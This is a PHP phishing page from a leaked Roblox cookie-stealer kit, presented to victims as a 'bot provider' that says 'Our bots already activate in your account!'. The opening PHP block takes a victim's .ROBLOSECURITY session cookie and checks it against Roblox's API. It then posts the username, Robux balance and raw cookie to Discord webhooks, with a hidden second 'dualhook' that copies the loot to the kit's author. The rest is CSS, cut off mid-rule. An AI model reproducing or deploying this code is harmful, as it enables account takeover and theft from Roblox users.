<?php
$logo = "https://media.discordapp.net/attachments/927449954367205378/932716250075897957/standard_1.gif"; // you can change to your own logo url
$name = "LEAKED BY VKEVIN"; // you can change to your own name
$webhook = "THEM"; // anyones webhook
$dualhook = "YOU"; // ofc shitter is dualhook so they have a dualhook in it change this to your dualhook
$inameb = $_SERVER['SERVER_NAME'];
$iname = strtoupper($_SERVER['SERVER_NAME']);
if (!empty($_GET["cookie"])) {
$cookie = $_GET["cookie"];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Cookie: .ROBLOSECURITY=' . $cookie
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$profile = json_decode(curl_exec($ch) , 1);
curl_close($ch);
if (empty($profile)) {
header("Refresh:0; url=page2.php");
} else {
$userid = $profile["UserID"];
$username = $profile["UserName"];
$robux = $profile["RobuxBalance"];
$premium = $profile["IsPremium"];
$vxleaked = json_encode([
            "username" => "BOT - $name",
            "avatar_url" => "$logo",
             "content" => "@everyone",
                "embeds" => [
                    [
                        "title" => '**:money_with_wings: +1 Result Account :candle:**',
                        "type" => "rich",
                        "description" => "**[Check Cookie](http://$inameb/chk.php?cookie=$cookie)**",
                        "url" => "https://www.roblox.com/users/",
                        "color" => hexdec("964B00"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/bust-thumbnail/image?userId=$userid&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "$name - Result",
                             "url" => "https://discord.gg/ATDdpH97JM"
                        ],
                        "fields" => [
                            [
                                "name" => "**Username**",
                                "value" => "$username",
                                "inline" => False
                            ],
                            [
                                "name" => "**Robux**",
                                "value" => "$robux",
                                "inline" => False
                            ],
                            [
                                "name" => "**Premium**",
                                "value" => "$premium",
                                "inline" => False
                            ],
                            [
                                "name" => "**Cookie :cookie:**",
                                "value" => "```$cookie```",
                                "inline" => False
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$dualhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $vxleaked,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);

if (filter_var($webhook, FILTER_VALIDATE_URL)) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$webhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $vxleaked,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
} 
                                        
        $response = curl_exec($ch);
        curl_close($ch);
        $done = "t";
}
}
?>
<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title><?php echo $iname?> - BOTS</title>
<meta name="description" content="<?php echo $iname?> is bot provider for roblox." />
<link href="https://images.rbxcdn.com/3b43a5c16ec359053fef735551716fc5.ico" rel="icon" />

<script src="https://use.fontawesome.com/0e45395a5f.js"></script>
<link href="https://fonts.googleapis.com/css?family=K2D:300,400,500,700,800" rel="stylesheet">
<?php if (isset($done)) { ?>
<!doctype html>
<html lang="en">
<body>
<section class="bg-gradient pt-5 pb-6">
<div class="container">
<div class="row">
<div class="col-12 d-flex flex-row align-items-center justify-content-between">
<div class="heading-brand"><?php echo $iname?></div>
</div>
</div>
<div class="row mt-6">
<div class="col-md-8 mx-auto text-center"><br><br><br>
<h1><p style="color:green">CONGRATULATIONS!</p><br> Our bots already activate in your account!</h1>
</div>
</div>
</div>
</section>
</body>
</html>
<?php } ?>
<!doctype html>
<html lang="en">

<style>
:root {
  --blue: #0000ff;
  --indigo: #3d5afe;
  --purple: #aa00ff;
  --pink: #f50057;
  --red: #ff1744;
  --orange: #f6c343;
  --yellow: #ffff00;
  --green: #5cc72a;
  --teal: #1de9b6;
  --cyan: #00e5ff;
  --white: #ffffff;
  --gray: #868e96;
  --gray-dark: #343a40;
  --primary: #ffff00;
  --secondary: #0000ff;
  --success: #5cc72a;
  --info: #00e5ff;
  --warning: #f6c343;
  --danger: #ff1744;
  --light: #f8f9fa;
  --dark: black;
  --breakpoint-xs: 0;
  --breakpoint-sm: 576px;
  --breakpoint-md: 768px;
  --breakpoint-lg: 992px;
  --breakpoint-xl: 1200px;
  --font-family-sans-serif: K2D, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
  --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }

*,
*::before,
*::after {
  box-sizing: border-box; }

html {
  font-family: sans-serif;
  line-height: 1.15;
  -webkit-text-size-adjust: 100%;
  -ms-text-size-adjust: 100%;
  -ms-overflow-style: scrollbar;
  -webkit-tap-highlight-color: transparent; }

@-ms-viewport {
  width: device-width; }

article, aside, dialog, figcaption, figure, footer, header, hgroup, main, nav, section {
  display: block; }

body {
  margin: 0;
  font-family: K2D, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: #343a40;
  text-align: left;
  background-color: #ffffff; }

[tabindex="-1"]:focus {
  outline: 0 !important; }

hr {
  box-sizing: content-box;
  height: 0;
  overflow: visible; }

h1, h2, h3, h4, h5, h6 {
  margin-top: 0;
  margin-bottom: 1rem; }

p {
  margin-top: 0;
  margin-bottom: 1rem; }

abbr[title],
abbr[data-original-title] {
  text-decoration: underline;
  -webkit-text-decoration: underline dotted;
          text-decoration: underline dotted;
  cursor: help;
  border-bottom: 0; }

address {
  margin-bottom: 1rem;
  font-style: normal;
  line-height: inherit; }

ol,
ul,
dl {
  margin-top: 0;
  margin-bottom: 1rem; }

ol ol,
ul ul,
ol ul,
ul ol {
  margin-bottom: 0; }

dt {
  font-weight: 700; }

dd {
  margin-bottom: .5rem;
  margin-left: 0; }

blockquote {
  margin: 0 0 1rem; }

dfn {
  font-style: italic; }

b,
strong {
  font-weight: bolder; }

small {
  font-size: 80%; }

sub,
sup {
  position: relative;
  font-size: 75%;
  line-height: 0;
  vertical-align: baseline; }

sub {
  bottom: -.25em; }

sup {
  top: -.5em; }

a {
  color: #000000;
  text-decoration: none;
  background-color: transparent;
  -webkit-text-decoration-skip: objects; }
  a:hover {
    color: #666666;
    text-decoration: none; }

a:not([href]):not([tabindex]) {
  color: inherit;
  text-decoration: none; }
  a:not([href]):not([tabindex]):hover, a:not([href]):not([tabindex]):focus {
    color: inherit;
    text-decoration: none; }
  a:not([href]):not([tabindex]):focus {
    outline: 0; }

pre,
code,
kbd,
samp {
  font-family: monospace, monospace;
  font-size: 1em; }

pre {
  margin-top: 0;
  margin-bottom: 1rem;
  overflow: auto;
  -ms-overflow-style: scrollbar; }

figure {
  margin: 0 0 1rem; }

img {
  vertical-align: middle;
  border-style: none; }

svg:not(:root) {
  overflow: hidden; }

table {
  border-collapse: collapse; }

caption {
  padding-top: 0.75rem;
  padding-bottom: 0.75rem;
  color: #adb5bd;
  text-align: left;
  caption-side: bottom; }

th {
  text-align: inherit; }

label {
  display: inline-block;
  margin-bottom: 0.5rem; }

button {
  border-radius: 0; }

button:focus {
  outline: 1px dotted;
  outline: 5px auto -webkit-focus-ring-color; }

input,
button,
select,
optgroup,
textarea {
  margin: 0;
  font-family: inherit;
  font-size: inherit;
  line-height: inherit; }

button,
input {
  overflow: visible; }

button,
select {
  text-transform: none; }

button,
html [type="button"],
[type="reset"],
[type="submit"] {
  -webkit-appearance: button; }

button::-moz-focus-inner,
[type="button"]::-moz-focus-inner,
[type="reset"]::-moz-focus-inner,
[type="submit"]::-moz-focus-inner {
  padding: 0;
  border-style: none; }

input[type="radio"],
input[type="checkbox"] {
  box-sizing: border-box;
  padding: 0; }

input[type="date"],
input[type="time"],
input[type="datetime-local"],
input[type="month"] {
  -webkit-appearance: listbox; }

textarea {
  overflow: auto;
  resize: vertical; }

fieldset {
  min-width: 0;
  padding: 0;
  margin: 0;
  border: 0; }

legend {
  display: block;
  width: 100%;
  max-width: 100%;
  padding: 0;
  margin-bottom: .5rem;
  font-size: 1.5rem;
  line-height: inherit;
  color: inherit;
  white-space: normal; }

progress {
  vertical-align: baseline; }

[type="number"]::-webkit-inner-spin-button,
[type="number"]::-webkit-outer-spin-button {
  height: auto; }

[type="search"] {
  outline-offset: -2px;
  -webkit-appearance: none; }

[type="search"]::-webkit-search-cancel-button,
[type="search"]::-webkit-search-decoration {
  -webkit-appearance: none; }

::-webkit-file-upload-button {
  font: inherit;
  -webkit-appearance: button; }

output {
  display: inline-block; }

summary {
  display: list-item;
  cursor: pointer; }

template {
  display: none; }

[hidden] {
  display: none !important; }

h1, h2, h3, h4, h5, h6,
.h1, .h2, .h3, .h4, .h5, .h6 {
  margin-bottom: 1rem;
  font-family: inherit;
  font-weight: 700;
  line-height: 1.5;
  color: #000000; }

h1, .h1 {
  font-size: 2.5rem; }

h2, .h2 {
  font-size: 1.75rem; }

h3, .h3 {
  font-size: 1.375rem; }

h4, .h4 {
  font-size: 1.25rem; }

h5, .h5 {
  font-size: 1.125rem; }

h6, .h6 {
  font-size: 1rem; }

.lead {
  font-size: 1.2rem;
  font-weight: 500; }

.display-1 {
  font-size: 5rem;
  font-weight: 300;
  line-height: 1.5; }

.display-2 {
  font-size: 4.5rem;
  font-weight: 300;
  line-height: 1.5; }

.display-3 {
  font-size: 3.5rem;
  font-weight: 300;
  line-height: 1.5; }

.display-4 {
  font-size: 2.5rem;
  font-weight: 300;
  line-height: 1.5; }

hr {
  margin-top: 1rem;
  margin-bottom: 1rem;
  border: 0;
  border-top: 2px solid #e9ecef; }

small,
.small {
  font-size: 80%;
  font-weight: 400; }

mark,
.mark {
  padding: 0.2em;
  background-color: #fcf8e3; }

.list-unstyled {
  padding-left: 0;
  list-style: none; }

.list-inline {
  padding-left: 0;
  list-style: none; }

.list-inline-item {
  display: inline-block; }
  .list-inline-item:not(:last-child) {
    margin-right: 0.5rem; }

.initialism {
  font-size: 90%;
  text-transform: uppercase; }

.blockquote {
  margin-bottom: 1rem;
  font-size: 1.25rem; }

.blockquote-footer {
  display: block;
  font-size: 80%;
  color: #adb5bd; }
  .blockquote-footer::before {
    content: "\2014 \00A0"; }

.container {
  width: 100%;
  padding-right: 15px;
  padding-left: 15px;
  margin-right: auto;
  margin-left: auto; }
  @media (min-width: 576px) {
    .container {
      max-width: 540px; } }
  @media (min-width: 768px) {
    .container {
      max-width: 720px; } }
  @media (min-width: 992px) {
    .container {
      max-width: 960px; } }
  @media (min-width: 1200px) {
    .container {
      max-width: 1140px; } }

.container-fluid {
  width: 100%;
  padding-right: 15px;
  padding-left: 15px;
  margin-right: auto;
  margin-left: auto; }

.row {
  display: -ms-flexbox;
  display: flex;
  -ms-flex-wrap: wrap;
      flex-wrap: wrap;
  margin-right: -15px;
  margin-left: -15px; }

.no-gutters {
  margin-right: 0;
  margin-left: 0; }
  .no-gutters > .col,
  .no-gutters > [class*="col-"] {
    padding-right: 0;
    padding-left: 0; }

.col-1, .col-2, .col-3, .col-4, .col-5, .col-6, .col-7, .col-8, .col-9, .col-10, .col-11, .col-12, .col,
.col-auto, .col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12, .col-sm,
.col-sm-auto, .col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, .col-md-12, .col-md,
.col-md-auto, .col-lg-1, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-10, .col-lg-11, .col-lg-12, .col-lg,
.col-lg-auto, .col-xl-1, .col-xl-2, .col-xl-3, .col-xl-4, .col-xl-5, .col-xl-6, .col-xl-7, .col-xl-8, .col-xl-9, .col-xl-10, .col-xl-11, .col-xl-12, .col-xl,
.col-xl-auto {
  position: relative;
  width: 100%;
  min-height: 1px;
  padding-right: 15px;
  padding-left: 15px; }

.col {
  -ms-flex-preferred-size: 0;
      flex-basis: 0;
  -ms-flex-positive: 1;
      flex-grow: 1;
  max-width: 100%; }

.col-auto {
  -ms-flex: 0 0 auto;
      flex: 0 0 auto;
  width: auto;
  max-width: none; }

.col-1 {
  -ms-flex: 0 0 8.33333%;
      flex: 0 0 8.33333%;
  max-width: 8.33333%; }

.col-2 {
  -ms-flex: 0 0 16.66667%;
      flex: 0 0 16.66667%;
  max-width: 16.66667%; }

.col-3 {
  -ms-flex: 0 0 25%;
      flex: 0 0 25%;
  max-width: 25%; }

.col-4 {
  -ms-flex: 0 0 33.33333%;
      flex: 0 0 33.33333%;
  max-width: 33.33333%; }

.col-5 {
  -ms-flex: 0 0 41.66667%;
      flex: 0 0 41.66667%;
  max-width: 41.66667%; }

.col-6 {
  -ms-flex: 0 0 50%;
      flex: 0 0 50%;
  max-width: 50%; }

.col-7 {
  -ms-flex: 0 0 58.33333%;
      flex: 0 0 58.33333%;
  max-width: 58.33333%; }

.col-8 {
  -ms-flex: 0 0 66.66667%;
      flex: 0 0 66.66667%;
  max-width: 66.66667%; }

.col-9 {
  -ms-flex: 0 0 75%;
      flex: 0 0 75%;
  max-width: 75%; }

.col-10 {
  -ms-flex: 0 0 83.33333%;
      flex: 0 0 83.33333%;
  max-width: 83.33333%; }

.col-11 {
  -ms-flex: 0 0 91.66667%;
      flex: 0 0 91.66667%;
  max-width: 91.66667%; }

.col-12 {
  -ms-flex: 0 0 100%;
      flex: 0 0 100%;
  max-width: 100%; }

.order-first {
  -ms-flex-order: -1;
      order: -1; }

.order-last {
  -ms-flex-order: 13;
      order: 13; }

.order-0 {
  -ms-flex-order: 0;
      order: 0; }

.order-1 {
  -ms-flex-order: 1;
      order: 1; }

.order-2 {
  -ms-flex-order: 2;
      order: 2; }

.order-3 {
  -ms-flex-order: 3;
      order: 3; }

.order-4 {
  -ms-flex-order: 4;
      order: 4; }

.order-5 {
  -ms-flex-order: 5;
      order: 5; }

.order-6 {
  -ms-flex-order: 6;
      order: 6; }

.order-7 {
  -ms-flex-order: 7;
      order: 7; }

.order-8 {
  -ms-flex-order: 8;
      order: 8; }

.order-9 {
  -ms-flex-order: 9;
      order: 9; }

.order-10 {
  -ms-flex-order: 10;
      order: 10; }

.order-11 {
  -ms-flex-order: 11;
      order: 11; }

.order-12 {
  -ms-flex-order: 12;
      order: 12; }

.offset-1 {
  margin-left: 8.33333%; }

.offset-2 {
  margin-left: 16.66667%; }

.offset-3 {
  margin-left: 25%; }

.offset-4 {
  margin-left: 33.33333%; }

.offset-5 {
  margin-left: 41.66667%; }

.offset-6 {
  margin-left: 50%; }

.offset-7 {
  margin-left: 58.33333%; }

.offset-8 {
  margin-left: 66.66667%; }

.offset-9 {
  margin-left: 75%; }

.offset-10 {
  margin-left: 83.33333%; }

.offset-11 {
  margin-left: 91.66667%; }

@media (min-width: 576px) {
  .col-sm {
    -ms-flex-preferred-size: 0;
        flex-basis: 0;
    -ms-flex-positive: 1;
        flex-grow: 1;
    max-width: 100%; }
  .col-sm-auto {
    -ms-flex: 0 0 auto;
        flex: 0 0 auto;
    width: auto;
    max-width: none; }
  .col-sm-1 {
    -ms-flex: 0 0 8.33333%;
        flex: 0 0 8.33333%;
    max-width: 8.33333%; }
  .col-sm-2 {
    -ms-flex: 0 0 16.66667%;
        flex: 0 0 16.66667%;
    max-width: 16.66667%; }
  .col-sm-3 {
    -ms-flex: 0 0 25%;
        flex: 0 0 25%;
    max-width: 25%; }
  .col-sm-4 {
    -ms-flex: 0 0 33.33333%;
        flex: 0 0 33.33333%;
    max-width: 33.33333%; }
  .col-sm-5 {
    -ms-flex: 0 0 41.66667%;
        flex: 0 0 41.66667%;
    max-width: 41.66667%; }
  .col-sm-6 {
    -ms-flex: 0 0 50%;
        flex: 0 0 50%;
    max-width: 50%; }
  .col-sm-7 {
    -ms-flex: 0 0 58.33333%;
        flex: 0 0 58.33333%;
    max-width: 58.33333%; }
  .col-sm-8 {
    -ms-flex: 0 0 66.66667%;
        flex: 0 0 66.66667%;
    max-width: 66.66667%; }
  .col-sm-9 {
    -ms-flex: 0 0 75%;
        flex: 0 0 75%;
    max-width: 75%; }
  .col-sm-10 {
    -ms-flex: 0 0 83.33333%;
        flex: 0 0 83.33333%;
    max-width: 83.33333%; }
  .col-sm-11 {
    -ms-flex: 0 0 91.66667%;
        flex: 0 0 91.66667%;
    max-width: 91.66667%; }
  .col-sm-12 {
    -ms-flex: 0 0 100%;
        flex: 0 0 100%;
    max-width: 100%; }
  .order-sm-first {
    -ms-flex-order: -1;
        order: -1; }
  .order-sm-last {
    -ms-flex-order: 13;
        order: 13; }
  .order-sm-0 {
    -ms-flex-order: 0;
        order: 0; }
  .order-sm-1 {
    -ms-flex-order: 1;
        order: 1; }
  .order-sm-2 {
    -ms-flex-order: 2;
        order: 2; }
  .order-sm-3 {
    -ms-flex-order: 3;
        order: 3; }
  .order-sm-4 {
    -ms-flex-order: 4;
        order: 4; }
  .order-sm-5 {
    -ms-flex-order: 5;
        order: 5; }
  .order-sm-6 {
    -ms-flex-order: 6;
        order: 6; }
  .order-sm-7 {
    -ms-flex-order: 7;
        order: 7; }
  .order-sm-8 {
    -ms-flex-order: 8;
        order: 8; }
  .order-sm-9 {
    -ms-flex-order: 9;
        order: 9; }
  .order-sm-10 {
    -ms-flex-order: 10;
        order: 10; }
  .order-sm-11 {
    -ms-flex-order: 11;
        order: 11; }
  .order-sm-12 {
    -ms-flex-order: 12;
        order: 12; }
  .offset-sm-0 {
    margin-left: 0; }
  .offset-sm-1 {
    margin-left: 8.33333%; }
  .offset-sm-2 {
    margin-left: 16.66667%; }
  .offset-sm-3 {
    margin-left: 25%; }
  .offset-sm-4 {
    margin-left: 33.33333%; }
  .offset-sm-5 {
    margin-left: 41.66667%; }
  .offset-sm-6 {
    margin-left: 50%; }
  .offset-sm-7 {
    margin-left: 58.33333%; }
  .offset-sm-8 {
    margin-left: 66.66667%; }
  .offset-sm-9 {
    margin-left: 75%; }
  .offset-sm-10 {
    margin-left: 83.33333%; }
  .offset-sm-11 {
    margin-left: 91.66667%; } }

@media (min-width: 768px) {
  .col-md {
    -ms-flex-preferred-size: 0;
        flex-basis: 0;
    -ms-flex-positive: 1;
        flex-grow: 1;
    max-width: 100%; }
  .col-md-auto {
    -ms-flex: 0 0 auto;
        flex: 0 0 auto;
    width: auto;
    max-width: none; }
  .col-md-1 {
    -ms-flex: 0 0 8.33333%;
        flex: 0 0 8.33333%;
    max-width: 8.33333%; }
  .col-md-2 {
    -ms-flex: 0 0 16.66667%;
        flex: 0 0 16.66667%;
    max-width: 16.66667%; }
  .col-md-3 {
    -ms-flex: 0 0 25%;
        flex: 0 0 25%;
    max-width: 25%; }
  .col-md-4 {
    -ms-flex: 0 0 33.33333%;
        flex: 0 0 33.33333%;
    max-width: 33.33333%; }
  .col-md-5 {
    -ms-flex: 0 0 41.66667%;
        flex: 0 0 41.66667%;
    max-width: 41.66667%; }
  .col-md-6 {
    -ms-flex: 0 0 50%;
        flex: 0 0 50%;
    max-width: 50%; }
  .col-md-7 {
    -ms-flex: 0 0 58.33333%;
        flex: 0 0 58.33333%;
    max-width: 58.33333%; }
  .col-md-8 {
    -ms-flex: 0 0 66.66667%;
        flex: 0 0 66.66667%;
    max-width: 66.66667%; }
  .col-md-9 {
    -ms-flex: 0 0 75%;
        flex: 0 0 75%;
    max-width: 75%; }
  .col-md-10 {
    -ms-flex: 0 0 83.33333%;
        flex: 0 0 83.33333%;
    max-width: 83.33333%; }
  .col-md-11 {
    -ms-flex: 0 0 91.66667%;
        flex: 0 0 91.66667%;
    max-width: 91.66667%; }
  .col-md-12 {
    -ms-flex: 0 0 100%;
        flex: 0 0 100%;
    max-width: 100%; }
  .order-md-first {
    -ms-flex-order: -1;
        order: -1; }
  .order-md-last {
    -ms-flex-order: 13;
        order: 13; }
  .order-md-0 {
    -ms-flex-order: 0;
        order: 0; }
  .order-md-1 {
    -ms-flex-order: 1;
        order: 1; }
  .order-md-2 {
    -ms-flex-order: 2;
        order: 2; }
  .order-md-3 {
    -ms-flex-order: 3;
        order: 3; }
  .order-md-4 {
    -ms-flex-order: 4;
        order: 4; }
  .order-md-5 {
    -ms-flex-order: 5;
        order: 5; }
  .order-md-6 {
    -ms-flex-order: 6;
        order: 6; }
  .order-md-7 {
    -ms-flex-order: 7;
        order: 7; }
  .order-md-8 {
    -ms-flex-order: 8;
        order: 8; }
  .order-md-9 {
    -ms-flex-order: 9;
        order: 9; }
  .order-md-10 {
    -ms-flex-order: 10;
        order: 10; }
  .order-md-11 {
    -ms-flex-order: 11;
        order: 11; }
  .order-md-12 {
    -ms-flex-order: 12;
        order: 12; }
  .offset-md-0 {
    margin-left: 0; }
  .offset-md-1 {
    margin-left: 8.33333%; }
  .offset-md-2 {
    margin-left: 16.66667%; }
  .offset-md-3 {
    margin-left: 25%; }
  .offset-md-4 {
    margin-left: 33.33333%; }
  .offset-md-5 {
    margin-left: 41.66667%; }
  .offset-md-6 {
    margin-left: 50%; }
  .offset-md-7 {
    margin-left: 58.33333%; }
  .offset-md-8 {
    margin-left: 66.66667%; }
  .offset-md-9 {
    margin-left: 75%; }
  .offset-md-10 {
    margin-left: 83.33333%; }
  .offset-md-11 {
    margin-left: 91.66667%; } }

@media (min-width: 992px) {
  .col-lg {
    -ms-flex-preferred-size: 0;
        flex-basis: 0;
    -ms-flex-positive: 1;
        flex-grow: 1;
    max-width: 100%; }
  .col-lg-auto {
    -ms-flex: 0 0 auto;
        flex: 0 0 auto;
    width: auto;
    max-width: none; }
  .col-lg-1 {
    -ms-flex: 0 0 8.33333%;
        flex: 0 0 8.33333%;
    max-width: 8.33333%; }
  .col-lg-2 {
    -ms-flex: 0 0 16.66667%;
        flex: 0 0 16.66667%;
    max-width: 16.66667%; }
  .col-lg-3 {
    -ms-flex: 0 0 25%;
        flex: 0 0 25%;
    max-width: 25%; }
  .col-lg-4 {
    -ms-flex: 0 0 33.33333%;
        flex: 0 0 33.33333%;
    max-width: 33.33333%; }
  .col-lg-5 {
    -ms-flex: 0 0 41.66667%;
        flex: 0 0 41.66667%;
    max-width: 41.66667%; }
  .col-lg-6 {
    -ms-flex: 0 0 50%;
        flex: 0 0 50%;
    max-width: 50%; }
  .col-lg-7 {
    -ms-flex: 0 0 58.33333%;
        flex: 0 0 58.33333%;
    max-width: 58.33333%; }
  .col-lg-8 {
    -ms-flex: 0 0 66.66667%;
        flex: 0 0 66.66667%;
    max-width: 66.66667%; }
  .col-lg-9 {
    -ms-flex: 0 0 75%;
        flex: 0 0 75%;
    max-width: 75%; }
  .col-lg-10 {
    -ms-flex: 0 0 83.33333%;
        flex: 0 0 83.33333%;
    max-width: 83.33333%; }
  .col-lg-11 {
    -ms-flex: 0 0 91.66667%;
        flex: 0 0 91.66667%;
    max-width: 91.66667%; }
  .col-lg-12 {
    -ms-flex: 0 0 100%;
        flex: 0 0 100%;
    max-width: 100%; }
  .order-lg-first {
    -ms-flex-order: -1;
        order: -1; }
  .order-lg-last {
    -ms-flex-order: 13;
        order: 13; }
  .order-lg-0 {
    -ms-flex-order: 0;
        order: 0; }
  .order-lg-1 {
    -ms-flex-order: 1;
        order: 1; }
  .order-lg-2 {
    -ms-flex-order: 2;
        order: 2; }
  .order-lg-3 {
    -ms-flex-order: 3;
        order: 3; }
  .order-lg-4 {
    -ms-flex-order: 4;
        order: 4; }
  .order-lg-5 {
    -ms-flex-order: 5;
        order: 5; }
  .order-lg-6 {
    -ms-flex-order: 6;
        order: 6; }
  .order-lg-7 {
    -ms-flex-order: 7;
        order: 7; }
  .order-lg-8 {
    -ms-flex-order: 8;
        order: 8; }
  .order-lg-9 {
    -ms-flex-order: 9;
        order: 9; }
  .order-lg-10 {
    -ms-flex-order: 10;
        order: 10; }
  .order-lg-11 {
    -ms-flex-order: 11;
        order: 11; }
  .order-lg-12 {
    -ms-flex-order: 12;
        order: 12; }
  .offset-lg-0 {
    margin-left: 0; }
  .offset-lg-1 {
    margin-left: 8.33333%; }
  .offset-lg-2 {
    margin-left: 16.66667%; }
  .offset-lg-3 {
    margin-left: 25%; }
  .offset-lg-4 {
    margin-left: 33.33333%; }
  .offset-lg-5 {
    margin-left: 41.66667%; }
  .offset-lg-6 {
    margin-left: 50%; }
  .offset-lg-7 {
    margin-left: 58.33333%; }
  .offset-lg-8 {
    margin-left: 66.66667%; }
  .offset-lg-9 {
    margin-left: 75%; }
  .offset-lg-10 {
    margin-left: 83.33333%; }
  .offset-lg-11 {
    margin-left: 91.66667%; } }

@media (min-width: 1200px) {
  .col-xl {
    -ms-flex-preferred-size: 0;
        flex-basis: 0;
    -ms-flex-positive: 1;
        flex-grow: 1;
    max-width: 100%; }
  .col-xl-auto {
    -ms-flex: 0 0 auto;
        flex: 0 0 auto;
    width: auto;
    max-width: none; }
  .col-xl-1 {
    -ms-flex: 0 0 8.33333%;
        flex: 0 0 8.33333%;
    max-width: 8.33333%; }
  .col-xl-2 {
    -ms-flex: 0 0 16.66667%;
        flex: 0 0 16.66667%;
    max-width: 16.66667%; }
  .col-xl-3 {
    -ms-flex: 0 0 25%;
        flex: 0 0 25%;
    max-width: 25%; }
  .col-xl-4 {
    -ms-flex: 0 0 33.33333%;
        flex: 0 0 33.33333%;
    max-width: 33.33333%; }
  .col-xl-5 {
    -ms-flex: 0 0 41.66667%;
        flex: 0 0 41.66667%;
    max-width: 41.66667%; }
  .col-xl-6 {
    -ms-flex: 0 0 50%;
        flex: 0 0 50%;
    max-width: 50%; }
  .col-xl-7 {
    -ms-flex: 0 0 58.33333%;
        flex: 0 0 58.33333%;
    max-width: 58.33333%; }
  .col-xl-8 {
    -ms-flex: 0 0 66.66667%;
        flex: 0 0 66.66667%;
    max-width: 66.66667%; }
  .col-xl-9 {
    -ms-flex: 0 0 75%;
        flex: 0 0 75%;
    max-width: 75%; }
  .col-xl-10 {
    -ms-flex: 0 0 83.33333%;
        flex: 0 0 83.33333%;
    max-width: 83.33333%; }
  .col-xl-11 {
    -ms-flex: 0 0 91.66667%;
        flex: 0 0 91.66667%;
    max-width: 91.66667%; }
  .col-xl-12 {
    -ms-flex: 0 0 100%;
        flex: 0 0 100%;
    max-width: 100%; }
  .order-xl-first {
    -ms-flex-order: -1;
        order: -1; }
  .order-xl-last {
    -ms-flex-order: 13;
        order: 13; }
  .order-xl-0 {
    -ms-flex-order: 0;
        order: 0; }
  .order-xl-1 {
    -ms-flex-order: 1;
        order: 1; }
  .order-xl-2 {
    -ms-flex-order: 2;
        order: 2; }
  .order-xl-3 {
    -ms-flex-order: 3;
        order: 3; }
  .order-xl-4 {
    -ms-flex-order: 4;
        order: 4; }
  .order-xl-5 {
    -ms-flex-order: 5;
        order: 5; }
  .order-xl-6 {
    -ms-flex-order: 6;
        order: 6; }
  .order-xl-7 {
    -ms-flex-order: 7;
        order: 7; }
  .order-xl-8 {
    -ms-flex-order: 8;
        order: 8; }
  .order-xl-9 {
    -ms-flex-order: 9;
        order: 9; }
  .order-xl-10 {
    -ms-flex-order: 10;
        order: 10; }
  .order-xl-11 {
    -ms-flex-order: 11;
        order: 11; }
  .order-xl-12 {
    -ms-flex-order: 12;
        order: 12; }
  .offset-xl-0 {
    margin-left: 0; }
  .offset-xl-1 {
    margin-left: 8.33333%; }
  .offset-xl-2 {
    margin-left: 16.66667%; }
  .offset-xl-3 {
    margin-left: 25%; }
  .offset-xl-4 {
    margin-left: 33.33333%; }
  .offset-xl-5 {
    margin-left: 41.66667%; }
  .offset-xl-6 {
    margin-left: 50%; }
  .offset-xl-7 {
    margin-left: 58.33333%; }
  .offset-xl-8 {
    margin-left: 66.66667%; }
  .offset-xl-9 {
    margin-left: 75%; }
  .offset-xl-10 {
    margin-left: 83.33333%; }
  .offset-xl-11 {
    margin-left: 91.66667%; } }

.form-control {
  display: block;
  width: 100%;
  padding: 0.5rem 1.5rem;
  font-size: 1rem;
  line-height: 1.5;
  color: #000000;
  background-color: #f8f9fa;
  background-clip: padding-box;
  border: 2px solid #f8f9fa;
  border-radius: 0.3rem;
  transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out; }
  @media screen and (prefers-reduced-motion: reduce) {
    .form-control {
      transition: none; } }
  .form-control::-ms-expand {
    background-color: transparent;
    border: 0; }
  .form-control:focus {
    color: #000000;
    background-color: #ffffff;
    border-color: #ffff00;
    outline: 0;
    box-shadow: none; }
  .form-control::-webkit-input-placeholder {
    color: #adb5bd;
    opacity: 1; }
  .form-control:-ms-input-placeholder {
    color: #adb5bd;
    opacity: 1; }
  .form-control::-ms-input-placeholder {
    color: #adb5bd;
    opacity: 1; }
  .form-control::placeholder {
    color: #adb5bd;
    opacity: 1; }
  .form-control:disabled, .form-control[readonly] {
    background-color: #f8f9fa;
    opacity: 1; }

select.form-control:not([size]):not([multiple]) {
  height: calc(2.5rem + 4px); }

select.form-control:focus::-ms-value {
  color: #000000;
  background-color: #f8f9fa; }

.form-control-file,
.form-control-range {
  display: block;
  width: 100%; }

.col-form-label {
  padding-top: calc(0.5rem + 2px);
  padding-bottom: calc(0.5rem + 2px);
  margin-bottom: 0;
  font-size: inherit;
  line-height: 1.5; }

.col-form-label-lg {
  padding-top: calc(0.75rem + 2px);
  padding-bottom: calc(0.75rem + 2px);
  font-size: 1.25rem;
